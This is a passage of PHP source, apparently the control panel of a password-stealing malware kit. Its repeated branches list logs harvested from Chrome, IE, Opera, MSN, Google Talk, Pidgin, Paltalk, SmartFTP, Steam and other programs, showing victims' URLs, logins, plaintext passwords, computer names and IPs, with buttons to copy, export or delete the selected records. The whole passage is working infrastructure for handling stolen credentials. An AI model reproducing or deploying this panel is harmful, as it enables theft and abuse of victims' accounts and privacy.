				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '16';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '16' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS chrome **************************************************************************************
	} elseif ($_GET["action"] == "logs-chrome") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '12';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '12' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS Google Talk **************************************************************************************
	} elseif ($_GET["action"] == "logs-gtalk") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '1';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '1' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS IDM **************************************************************************************
	} elseif ($_GET["action"] == "logs-idm") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '14';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '14' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS IE **************************************************************************************
	} elseif ($_GET["action"] == "logs-ie") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '11';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '11' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS MSN **************************************************************************************
	} elseif ($_GET["action"] == "logs-msn") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '0';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '0' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS no-ip **************************************************************************************
	} elseif ($_GET["action"] == "logs-noip") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '8';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '8' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS opera **************************************************************************************
	} elseif ($_GET["action"] == "logs-opera") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '13';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '13' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
 
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS paltalk **************************************************************************************
	} elseif ($_GET["action"] == "logs-pal") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '6';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '6' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS pidgin **************************************************************************************
	} elseif ($_GET["action"] == "logs-pid") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '5';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '5' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS smartFTP **************************************************************************************
	} elseif ($_GET["action"] == "logs-smart") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '17';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '17' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS steam **************************************************************************************
	} elseif ($_GET["action"] == "logs-steam") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '7';", $mysql);
